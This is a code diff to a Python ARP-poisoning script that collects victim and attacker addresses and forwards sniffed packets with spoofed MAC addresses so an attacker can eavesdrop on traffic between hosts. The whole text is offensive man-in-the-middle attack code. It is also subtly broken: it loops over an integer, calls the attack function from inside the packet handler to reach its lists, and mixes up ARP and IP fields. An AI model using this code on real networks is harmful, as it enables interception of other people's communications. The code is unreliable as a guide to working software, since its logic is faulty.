@@ -31,6 +31,7 @@ def arppoison():
     # The MAC and IP addresses of the victims and the attacker are obtained
     # victims must be separated into two groups, servers and hosts
     for i in range(nrOfHosts): 
+        # Note: i + 1 is printed to the user of the software
         macVictimList.append(raw_input("The MAC address of the " + str(i+1) + "th victim:"))
         ipVictimList.append(raw_input("The IP address of the " + str(i+1) + "th victim:"))
     macAttacker = raw_input("The MAC address of the attacker: ")
@@ -75,17 +76,17 @@ def arppoison():
     
 # This method is used to forward the received packet we sniffed to the host it was intended to be sent to
 def forward_packet(packet, macVictimList, ipVictimList, macAttacker):
-    for i in len(ipVictimList):
-        if (packet[IP].dst == ipVictimList[i] and packet[Ether].dst == macAttacker):
+    for i in len(arppoison().ipVictimList):
+        if (packet[ARP].pdst == arppoison().ipVictimList[i] and packet[Ether].dst == macAttacker):
             # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
-            packet[Ether].dst = macVictimList[i]
+            packet[Ether].dst = arppoison().macVictimList[i]
             # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
             packet[Ether].src = macAttacker
             # Resend the packet to it's rightful destination
             sendp(packet)
 
             # Let the attacker know who sent a packet to whom
-            print("A packet from " + str(packet[IP].src) + " has been redirected to " + str(packet[IP].dst))
+            print("A packet from " + str(packet[ARP].psrc) + " has been redirected to " + str(packet[ARP].pdst))
 
             # If a match has been found we break out of the loop as only one match can be found
             break
